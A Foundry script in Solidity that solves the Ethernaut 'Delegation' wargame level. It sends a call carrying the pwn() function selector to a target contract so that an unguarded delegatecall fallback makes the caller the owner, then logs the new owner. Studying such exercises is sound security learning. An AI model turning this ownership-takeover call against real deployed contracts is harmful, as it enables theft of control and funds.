// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console2} from "forge-std/console2.sol";
import {Delegation, Delegate} from "../../src/level-06/EthernautDelegation.sol";

contract DelegationSolution is Script {
    Delegation delegation =
        Delegation(0x9d1EbDcDDa938AAf3A495c7DF02191ffa46e80C8);

    function run() external {
        vm.broadcast(vm.envUint("PRIVATE_KEY"));
        (bool success, ) = address(delegation).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "Attack failed");
        if (success) {
            console2.log("Current owner: ", delegation.owner()); // Kunci dari delegate call itu FUNCTION SELECTOR
        }
    }
}
